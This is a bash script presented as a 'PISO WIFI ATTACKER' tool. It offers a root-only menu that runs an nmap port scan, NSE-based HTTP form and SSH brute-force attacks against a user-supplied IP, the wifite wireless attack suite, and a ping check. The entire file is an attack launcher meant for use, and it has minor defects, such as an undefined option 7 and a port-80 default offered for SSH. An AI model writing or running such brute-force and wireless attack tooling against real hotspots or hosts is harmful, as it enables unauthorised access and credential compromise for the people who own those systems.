#!/bin/bash
# Author: xfr0g
# Date: 2024
# Name: pisOwned: PISO WIFI ATTACKER

# Colors
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
WB='\033[1;37m'
NC='\033[1;0m'

# Root
if [[ $UID -ne 0 ]]
then
    echo "Run pisowned as root."
    exit 1
fi

# User Interface
function userinterface(){
    echo -e "       ${GREEN}_       ${RED}⢀⣠⣤⣤⣄⡀⠀                          ${GREEN}_ "
    echo -e " ${GREEN}_ __ (_)___  ${RED}⣴⣿⣿⣿⣿⣿⣿⣦ ${GREEN}__      ___ __   ___  __| |"
    echo -e "${GREEN}| '_ \| / __| ${RED}⣿⣿⣿⣿⣿⣿⣿⣿ ${GREEN}\ \ /\ / / '_ \ / _ \/ _\` |"
    echo -e "${GREEN}| |_) | \__ \ ${RED}⣇⠈⠉⡿⢿⠉⠁⢸  ${GREEN}\ V  V /| | | |  __/ (_| |"
    echo -e "${GREEN}| .__/|_|___/ ${RED}⠙⠛⢻⣷⣾⡟⠛⠋   ${GREEN}\_/\_/ |_| |_|\___|\__,_|"
    echo -e "${GREEN}|_|              ${RED}⣤⣤${NC}"
    echo ""
    echo -e "\t    ${YELLOW}<< PISO WIFI ATTACKER >>${NC}"
}
userinterface

sleep 1

function main(){
    # Options (we will use NMAP for options 1-3 and wifite for option 4)
    echo ""
    echo -e "${WB}[1] Port scan"
    echo -e "[2] HTTP Brute-force attack"
    echo -e "[3] SSH Brute-force attack"
    echo -e "[4] wifite"
    echo -e "[5] Check ping"
    echo -e "[6] Exit"
    echo ""
    echo -ne "Choose an option (1|2|3|4|5|6|7): "
    read option 
}
main

# A SIMPLE OPEN PORT SCANNER USING NMAP
function opt1() {
    clear
    userinterface
    echo ""
    echo -e "${WB}PORT SCAN\n"
    echo -ne "[*] Enter IP: "
    read ip
    echo -e "\nSCANNING FOR ALL OPEN PORTS...\n${RED}"
    
    nmap $ip | grep open
    
    exit 1
}

# A SIMPLE HTTP BRUTE-FORCE ATTACK USING NSE
function opt2(){
    clear
    userinterface
    echo ""
    echo -e "${WB}HTTP BRUTE-FORCE ATTACK\n"
    echo -ne "[*] Enter IP: "
    read ip
    echo -ne "[*] Enter port (80): "
    read port
    echo -e "\nBRUTE-FORCING...\n${RED}"
    
    nmap $ip -p $port -Pn --script http-form-brute

    if [[ $? -ne 0 ]]
    then
        echo -e "Attack failed."
        exit 1
    fi
    
    exit 1
}

# A SIMPLE SSH BRUTE-FORCE ATTACK USING NSE
function opt3() {
    clear
    userinterface
    echo ""
    echo -e "${WB}SSH BRUTE-FORCE ATTACK\n"
    echo -ne "[*] Enter IP: "
    read ip
    echo -ne "[*] Enter port (80): "
    read port
    echo -e "\nBRUTE-FORCING...\n${RED}"
    
    nmap $ip -p $port -Pn --script ssh-brute

    if [[ $? -ne 0 ]]
    then
        echo -e "Attack failed."
        exit 1
    fi
    
    exit 1
}

# WIFITE FOR VARIOUS TYPES OF WIRELESS ATTACKS
function opt4() {
    clear
    userinterface
    echo ""
    echo -e "How to use wifite is beyond the scope of this script but is still part of the options."
    sleep 5
    clear
    wifite
}

# CHECK IF HOST IS UP OR DOWN USING PING
function opt5() {
    clear
    userinterface
    echo ""
    echo -e "${WB}CHECK PING\n"
    echo -ne "[*] Enter IP/URL: "
    read ip
    echo -e "\nCHECKING IF HOST IS REACHABLE...\n${RED}"
    
    ping -c1 $ip &> /dev/null

    if [[ $? -eq 0 ]]
    then
        echo -e "Host is reachable."
    else
        echo -e "Host is not reachable."
    fi
    
    exit 1
}

# EXIT OUT OF THE SCRIPT
function opt6() {
    exit 1
}

# Start (if-elif to case)
#if [[ $option -eq 1 || $option -eq 01 ]]
#then
#   opt1
#elif [[ $option -eq 2 || $option -eq 02 ]]
#then
#    opt2
#elif [[ $option -eq 3 || $option -eq 03 ]]
#then
#    opt3
#elif [[ $option -eq 4 || $option -eq 04 ]]
#then
#    opt4
#elif [[ $option -eq 5 || $option -eq 05 ]]
#then
#    opt5
#fi

    case $option in 

1) opt1;;
2) opt2;;
3) opt3;;
4) opt4;;
5) opt5;;
6) opt6;;
7) opt7;;
*) echo "Invalid choice"

    esac
